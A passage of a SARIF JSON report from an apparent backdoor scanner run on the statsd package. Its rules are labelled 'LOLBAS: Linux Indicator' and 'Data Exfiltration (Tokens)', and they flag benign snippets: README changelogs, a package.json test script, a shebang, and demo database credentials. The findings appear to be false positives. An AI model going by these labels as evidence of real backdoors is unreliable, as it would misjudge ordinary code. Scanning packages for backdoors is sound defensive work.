            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 80,
                  "endLine": 44,
                  "endColumn": 86,
                  "snippet": {
                    "text": "    2.0.2 - October 22 2012\n       - Fix #51, #48 - createResource() should check for null clientCb in err case (contributed by pooyasencha)\n       - Merged #52 - fix bug of infinite wait when create object aync error (contributed by windyrobin)\n       - Merged #53 - change the position of dispense and callback to ensure the time order (contributed by windyrobin)\n    \n    2.0.1 - August 29 2012\n       - Fix #44 - leak of 'err' and 'obj' in createResource()\n",
                    "rendered": {
                      "text": "    2.0.2 - October 22 2012\n       - Fix #51, #48 - createResource() should check for null clientCb in err case (contributed by pooyasencha)\n       - Merged #52 - fix bug of infinite wait when create object aync error (contributed by windyrobin)\n       - Merged #53 - change the position of dispense and callback to ensure the time order (contributed by windyrobin)\n    \n    2.0.1 - August 29 2012\n       - Fix #44 - leak of 'err' and 'obj' in createResource()\n",
                      "markdown": "`    2.0.2 - October 22 2012\n       - Fix #51, #48 - createResource() should check for null clientCb in err case (contributed by pooyasencha)\n       - Merged #52 - fix bug of infinite wait when create object aync error (contributed by windyrobin)\n       - Merged #53 - change the position of dispense and callback to ensure the time order (contributed by windyrobin)\n    \n    2.0.1 - August 29 2012\n       - Fix #44 - leak of 'err' and 'obj' in createResource()\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 88,
                  "endLine": 30,
                  "endColumn": 94,
                  "snippet": {
                    "text": "        - fix README error about priority queueing (spotted by @kmdm)\n\n    2.1.0 - June 19 2014\n       - Merged #72 - Add optional returnToHead flag, if true, resources are returned to head of queue (stack like \n         behaviour) upon release (contributed by calibr), also see #68 for further discussion.\n\n    2.0.4 - July 27 2013\n",
                    "rendered": {
                      "text": "        - fix README error about priority queueing (spotted by @kmdm)\n\n    2.1.0 - June 19 2014\n       - Merged #72 - Add optional returnToHead flag, if true, resources are returned to head of queue (stack like \n         behaviour) upon release (contributed by calibr), also see #68 for further discussion.\n\n    2.0.4 - July 27 2013\n",
                      "markdown": "`        - fix README error about priority queueing (spotted by @kmdm)\n\n    2.1.0 - June 19 2014\n       - Merged #72 - Add optional returnToHead flag, if true, resources are returned to head of queue (stack like \n         behaviour) upon release (contributed by calibr), also see #68 for further discussion.\n\n    2.0.4 - July 27 2013\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 119,
                  "startColumn": 10,
                  "endLine": 119,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        var Client = require('mysql').Client;\n        var c = new Client();\n        c.user     = 'scott';\n        c.password = 'tiger';\n        c.database = 'mydb';\n        c.connect();\n        \n",
                    "rendered": {
                      "text": "        var Client = require('mysql').Client;\n        var c = new Client();\n        c.user     = 'scott';\n        c.password = 'tiger';\n        c.database = 'mydb';\n        c.connect();\n        \n",
                      "markdown": "`        var Client = require('mysql').Client;\n        var c = new Client();\n        c.user     = 'scott';\n        c.password = 'tiger';\n        c.database = 'mydb';\n        c.connect();\n        \n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/connection-parse/package.json"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 46,
                  "endLine": 7,
                  "endColumn": 52,
                  "snippet": {
                    "text": "  \"description\": \"Simple TCP connection string parser\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"./node_modules/.bin/mocha $(shell find test -name '*.test.js')\"\n  },\n  \"repository\": {\n    \"type\": \"git\",\n",
                    "rendered": {
                      "text": "  \"description\": \"Simple TCP connection string parser\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"./node_modules/.bin/mocha $(shell find test -name '*.test.js')\"\n  },\n  \"repository\": {\n    \"type\": \"git\",\n",
                      "markdown": "`  \"description\": \"Simple TCP connection string parser\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"./node_modules/.bin/mocha $(shell find test -name '*.test.js')\"\n  },\n  \"repository\": {\n    \"type\": \"git\",\n`"
                    }
                  },
                  "sourceLanguage": "package.json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/bin/statsd"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env node\nrequire('./../stats.js');",
                    "rendered": {
                      "text": "#!/usr/bin/env node\nrequire('./../stats.js');",
                      "markdown": "`#!/usr/bin/env node\nrequire('./../stats.js');`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}